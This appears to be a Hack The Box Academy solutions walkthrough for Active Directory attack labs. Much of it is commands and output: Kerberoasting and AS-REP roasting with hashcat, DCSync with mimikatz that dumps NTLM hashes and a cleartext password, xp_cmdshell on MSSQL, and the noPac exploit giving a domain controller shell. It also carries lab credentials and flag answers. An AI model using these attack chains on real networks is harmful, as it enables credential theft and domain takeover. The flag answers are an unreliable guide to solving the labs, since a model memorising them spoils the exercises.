└──╼ [★]$ hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$d4cac857ed8f6b9bd4df91e0dca95ab1$b5b1908355b367e199b8cc4d6e34f6c83c7c49318da7f3f8ec5342d025081c8a4b25b07c898f4a787a9b27342fbe0adac91dcba6850e17452f5b6fd7599ce32ad5da3f1c93a3b7dbb37d45941c3682a6bf301cc503d95063580b73eea3c2dc11130c0da7d9b4f3908b5d5ee3609b1c2cfd3050ec225f8774d86f92676a8209a875f3f7ae9c991628741fc93a727a2c4684181038a586328df02e7f68c67e8cee4e948a6fb57c3ab7419a24811e7e95bc1801ba5f70bb0a6464f6a9b9c9351d7a3c4259074b35e4fb82797957f34a314c3e6d0de4c96a0bb52e8678686460742b10b8a1a25d0e2953b4712253ced0d13dab9afd8aba8b4b338364f923f89c9167fe76c37f7527b8ddfd4c0bbfa53be552b11272a81df74d033d9b4fe9bdfa3296efdd9e3301cbc8293401fcff3b7694e8339d56c9e4be5ebde1dad8706e25dd05e2851a1749235a3785658971a692b4f1740a69d2d2f66fa763d551ecbfeffeb8fc54951fc756430c1e550fd0dd8f6900d2af5bf5d381ac77454acdb04779fcd2bda3597d0b7c6a1e7a4c06d1637e81b3810a763086d69e8df0f2d6e56b020eda4cab7ee4f3d61253529ac3f17c546fc6e5eee484f8343bcc2d35a9406b93b64f6d31b5a649ead1c9b6bc71db2ec82cfe5dc77285cd5941da79111a0d97efe049270e4d470209fd92aa7331a7caf734be5d834c0d6e4f6bd23c9f7556008f7bca7291567b4c3d9270ab3e190531d221029277e85d785b7d3850d8a9b03a03eaf7b6e1bb0ffa4eb476f433d032ea993eed03a14227bb4879b4fd76b579799cf7cb093ebe27b7cc21a92451e43c274cf26161bcfea1dfca8249f6d91ff7cf4cf33384ef1969409b65d5290b0991f9d34866cd0f38f0df37e858cf78fff6a4c1e5a0c84e8cc2e2340d7a5fbc61f3b836cdc7d7909279f1cbdbe84dd069808e1bfc7cd01cc9449b73705611fbfc5ddccaa9cc308b2591b1ad9bb428956a4eb7a88b54273a5008d6f52a65a036d283111d539c2d19ee7611ee1822f1749e6173876d9107086c6a93265ab49ed9d463b76f03f579c8e99e9ab5899c5fa0d29bc7b73180444d101f7ba048e8309aed360d933cff20561e5af5d3f2f1049448d1c4be2ff341992c9bf0a9232c2fef51aae507306b7b46dec98652eced93f787cbad674f8b2acc7909c914e995729fb476ca02c4ff90d9c146add22db762bc183c00514b234032df753c73fcd74b28a18eda9516f2300d634e551828deb8ecd26c14ffb8a6d9eafbeae9732e4e2dd767fc50cc7cd3caf10c0dfb2ff3d9836cb79f9dd886ee7c95e85a75b1a70fb32c8527e99c3055caee0775f7375c00b1a207802f368981dd16197718884c48aefc47ceaf0e46413caad45af4f5d8478f65485e62a5655abc9b35a38e24bdd8a426b0f1ac208dfef8239e2eab3c43b26ff4925b3fd6eb85c294d733eff97e9db6e50c0d0b398744b74a998fc01083df41d7f6c26cf9f203e5ed0f7be33e76ebae2d27d4a282289b8718ce76e03df0549005875111957fa0a28b85a869dd18f9774850dec55142876391b3ec293efadb2d32808ca89c91090da1a8e569f50f7edbf0036dbe732e776ced446eab9704a1de14c3ba17898381165852ae928a01fd158c4c77368b73a47fd3f6bf8a1884c09d:SyncMaster757
```

Answer: `SyncMaster757`

# DCSync

## Question 1

### "Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`::

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
```

Students then need to check for `Reversible Encryption` options assigned to users by using `Get-DomainUser`:

Code: powershell

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

```
PS C:\Tools> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Students will find out that the other user is `syncron`.

Answer: `syncron`

# DCSync

## Question 2

### "What is this user's cleartext password?"

Using the same `xfreerdp` connection established in the previous question, students need to open `Command Prompt` and use `runas` on the user `adunn` (providing the password `SyncMaster757` when prompted to):

Code: cmd

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Students will then attain a `PowerShell` session as the user `adunn`:

![[HTB Solutions/CAPE/z. images/5fc8df52fe93655de5ecaab97d46c9d9_MD5.jpg]]

Afterward, students will need to change directories to `C:\Tools\mimikatz\x64\`:

Code: powershell

```powershell
cd C:\Tools\mimikatz\x64\
```

```
PS C:\Windows\System32> cd C:\Tools\mimikatz\x64\
```

And then, students need to run `mimikatz`:

Code: powershell

```powershell
.\mimikatz.exe
```

```
 PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '###'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Students need to perform a `DCSync` attack using `mimikatz`:

Code: powershell

```powershell
lsadump::dcsync /user:INLANEFREIGHT\syncron
```

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\syncron

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\syncron' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : syncron

** SAM ACCOUNT **

SAM Username         : syncron
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000280 ( ENCRYPTED_TEXT_PASSWORD_ALLOWED NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/2/2022 12:36:15 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-5617
Object Relative ID   : 5617

Credentials:
  Hash NTLM: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 0: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: fed98466f2be61fb0409b5a71e2f977f
    lm  - 1: 7649a3cc283466005bd6988f90fd6a68

<SNIP>

* Packages *
    NTLM-Strong-NTOWF

* Primary:CLEARTEXT *
    Mycleart3xtP@ss!
```

From the output of `mimikatz`, students will find out that the cleartext password of the user `syncron` is `Mycleart3xtP@ss!`.

Answer: `Mycleart3xtP@ss!`

# DCSync

## Question 3

### "Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer."

Using the same `xfreerdp` connection established in the first question, students need to open `Command Prompt` and run the following `runas` command (providing the password `SyncMaster57` when prompted to):

Code: powershell

```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Students will then attain a `PowerShell` session as the user `adunn`:

![[HTB Solutions/CAPE/z. images/5fc8df52fe93655de5ecaab97d46c9d9_MD5.jpg]]

Afterward, they will need then to change directories to `C:\Tools\mimikatz\x64\`:

Code: powershell

```powershell
cd C:\Tools\mimikatz\x64\
```

```
PS C:\Windows\System32> cd C:\Tools\mimikatz\x64\
```

And then run `mimikatz`:

Code: powershell

```powershell
.\mimikatz.exe
```

```
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

 .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
# / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
# \ / #       > https://blog.gentilkiwi.com/mimikatz
'# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '###'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Students need to use `mimikatz` to perform a `DCSync` attack; students will find out that the `NTLM` hash is `4bb3b317845f0954200a6b0acc9b9f9a` for the user `khartsfield`:

Code: powershell

```powershell
lsadump::dcsync /user:INLANEFREIGHT\khartsfield
```

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\khartsfield

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\khartsfield' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Kim Hartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 10:37:03 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
    lm  - 0: 6d57ae87ad6df46fd47e67f5cbbf17ad

<SNIP>

mimikatz #
```

Answer: `4bb3b317845f0954200a6b0acc9b9f9a`

# Privileged Access

## Question 1

### "What other user in the domain has CanPSRemote rights to a host?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory:

Code: powershell

```powershell
cd C:\Tools\
```

```
PS C:\Windows\system32> cd C:\Tools\
```

Students then need to run `SharpHound` to collect data which will be saved inside a ZIP file for the later use in it in `BloodHound`:

Code: powershell

```powershell
.\SharpHound.exe
```

```
PS C:\Tools> .\SharpHound.exe

2022-06-20T07:32:05.9292877-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:05.9449170-07:00|INFORMATION|Initializing SharpHound at 7:32 AM on 6/20/2022
2022-06-20T07:32:06.4761560-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:07.0074141-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-20T07:32:37.7261930-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 66 MB RAM
2022-06-20T07:32:55.3199297-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-20T07:32:55.3980527-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-20T07:33:07.7418424-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 126 MB RAM
2022-06-20T07:33:14.6481630-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-20T07:33:14.6949636-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Status: 3809 objects finished (+16 56.85075)/s -- Using 80 MB RAM
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Enumeration finished in 00:01:07.9744738
2022-06-20T07:33:15.4918222-07:00|INFORMATION|SharpHound Enumeration Completed at 7:33 AM on 6/20/2022! Happy Graphing!
```

Afterward, students need to navigate the directory where `BloodHound` is and run it:

Code: powershell

```powershell
cd .\BloodHound-GUI\
.\BloodHound.exe
```

```
PS C:\Tools> cd .\BloodHound-GUI\
PS C:\Tools\BloodHound-GUI> .\BloodHound.exe
```

Subsequently, students need to import the ZIP file generated by `SharpHound` into `BloodHound` by clicking on "Upload Data":

![[HTB Solutions/CAPE/z. images/19810148e2280bc68fd9ec12ae440946_MD5.jpg]]

Students then need to choose the ZIP file ending in "\_BloodHound":

![[HTB Solutions/CAPE/z. images/9e5377e099c647bffe9167cd0ef3d492_MD5.jpg]]

Students then need to use a Cypher query to enumerate `WinRM`; students will find out that the other user is `bdavis`:

Code: powershell

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[HTB Solutions/CAPE/z. images/fadc18c3027fd8b7f6e53752e274b972_MD5.jpg]]

Answer: `bdavis`

# Privileged Access

## Question 2

### "What host can this user access via WinRM? (just the computer name)"

Using the same `xfreerdp` connection established from the previous question and the same data generated by `SharpHound`, students need to use the same Cypher query to enumerate `WinRM`; students will find out that the computer's name is `ACADEMY-EA-DC01`:

Code: powershell

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[HTB Solutions/CAPE/z. images/e358874c739fefa9b27806b29894d6f7_MD5.jpg]]

Answer: `ACADEMY-EA-DC01`

# Privileged Access

## Question 3

### "Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\\Users\\damundsen\\Desktop\\flag.txt."

Using the same `xfreerdp` connection established in question 1 of this section, students need to open `Command Prompt` and SSH to EA-ATTACK01 using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: powershell

```powershell
ssh htb-student@172.16.5.225
```

```
C:\Users\htb-student>ssh htb-student@172.16.5.225

The authenticity of host '172.16.5.225 (172.16.5.225)' can't be established.
ECDSA key fingerprint is SHA256:BG+VzltzkKbaMbC5FR8GU9x0pcbUBhct6AGrnjH/CHg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.5.225' (ECDSA) to the list of known hosts.
htb-student@172.16.5.225's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

<SNIP>

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to use `mssqlicent.py` from `Impacket` to connect to `ACADEMY-EA-DB01` (which is `172.16.5.150`) using the password `SQL1234!`:

Code: shell

```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:SQL1234!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server   (140 3232)
[!] Press help for extra shell commands
SQL>
```

Subsequently, students need to print the contents of the flag at `C:\Users\damundsen\Desktop\flag.txt` after enabling the built-in extended stored procedure `xp_cmdshell`; students will find out that the contents of the flag is `1m_the_sQl_@dm1n_n0w!`:

Code: powershell

```powershell
enable_xp_cmdshell
xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```

```
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> xp_cmdshell type C:\\Users\\damundsen\\Desktop\\flag.txt

output

--------------------------------------------------------------------------------

1m_the_sQl_@dm1n_n0w!

SQL>
```

Answer: `1m_the_sQl_@dm1n_n0w!`

# Bleeding Edge Vulnerabilities

## Question 1

### "Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)"

The two `CVEs` that indicate `NoPac.py` may work are `2021-42278` & `2021-42287`:

![[HTB Solutions/CAPE/z. images/e4a2092b1a1b22f88deb92d6d02bab9c_MD5.jpg]]

Answer: `2021-42278&2021-42287`

# Bleeding Edge Vulnerabilities

## Question 2

### "Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students need to change directories to `/opt/noPac` and then run the `noPac` exploit to gain a system shell:

Code: shell

```shell
cd /opt/noPac/
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $cd /opt/noPac/
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-IUGSHIV1B9Z$"
[*] MachineAccount "WIN-IUGSHIV1B9Z$" password = wxvGJUj)e$h2
[*] Successfully added machine account WIN-IUGSHIV1B9Z$ with password wxvGJUj)e$h2.
[*] WIN-IUGSHIV1B9Z$ object = CN=WIN-IUGSHIV1B9Z,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-IUGSHIV1B9Z$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-IUGSHIV1B9Z$
[*] Restored WIN-IUGSHIV1B9Z$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-IUGSHIV1B9Z$
[-] Delete computer WIN-IUGSHIV1B9Z$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>
```

At last, students need to print out the contents of the flag at `C:\Administrator\Desktop\DailyTasks\flag.txt`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
```

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt

D0ntSl@ckonN0P@c!
```

Answer: `D0ntSl@ckonN0P@c!`

# Miscellaneous Misconfigurations

## Question 1

### "Find another user with the passwd\_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y"."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`:

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
```

Then, students need to use `Get-DomainUser` to enumerate users for the `PASSWD_NOTREQD` setting; students will find out that the `samaccountname` of the other user with the `passwd_notreqd` field set is `ygroce`:

Code: powershell

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

```
PS C:\Tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
```

Answer: `ygroce`

# Miscellaneous Misconfigurations

## Question 2

### "Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer."

Using the same `xfreerdp` connection established in the previous question, students need to use `Get-DomainUser` to enumerate users for the `Do not require Kerberos pre-authentication setting` setting; students will find out that the user is `ygroce`:

Code: powershell

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```
PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Students need to use `Rubeus` to perform `AS-REP roasting` against the user `ygroce`:

Code: powershell

```powershell
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```

```
PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : ygroce
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
[*] SamAccountName         : ygroce
[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:E3B8FCAB0E3905D4678B190116218DCA$F297B10A7C0E3FF100FB35E758FE164DE662539937C77F197DFDA15884F4095DB9E5BB7AFE3C8F2D49D72EC53BCCF0B48D02BB7A51A99142BE23372910F99BE6ECF2C6227ED0E31A9AD4DB28B395CF8EA90DD1B3F87324227872AF5DCB2E4CD5527B006DDA4A2434877094505494B286260CCB3DA4E085E6F7C57FB07EC223922DA0591DB76B4ED30BADFB39CBF7B1F1EBA5267B633FAD71BA2CDF252BBA41EA7B602FCA3D860FDFEA639695F7A4F09B79EA08D225F37DB67F857180B096E0E00DFD240FE8D01E67E40C8DD2E05DED3E164C84DEF8134188E7597F86D9EA1E9CC48FDA29C2F0853453904EF8A7A7D940B2D8201DA101FE50B2CC
```

Then, students need to save the hash into a file in `Pwnbox`/`PMVPN` and then use `Hashcat` to crack it, utilizing hash-mode 18200; students will find out that the plaintext password of the cracked hash is `Pass@word`:

Code: shell

```shell
hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt 
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:e3b8fcab0e3905d4678b190116218dca$f297b10a7c0e3ff100fb35e758fe164de662539937c77f197dfda15884f4095db9e5bb7afe3c8f2d49d72ec53bccf0b48d02bb7a51a99142be23372910f99be6ecf2c6227ed0e31a9ad4db28b395cf8ea90dd1b3f87324227872af5dcb2e4cd5527b006dda4a2434877094505494b286260ccb3da4e085e6f7c57fb07ec223922da0591db76b4ed30badfb39cbf7b1f1eba5267b633fad71ba2cdf252bba41ea7b602fca3d860fdfea639695f7a4f09b79ea08d225f37db67f857180b096e0e00dfd240fe8d01e67e40c8dd2e05ded3e164c84def8134188e7597f86d9ea1e9cc48fda29c2f0853453904ef8a7a7d940b2d8201da101fe50b2cc:Pass@word

<SNIP>
```

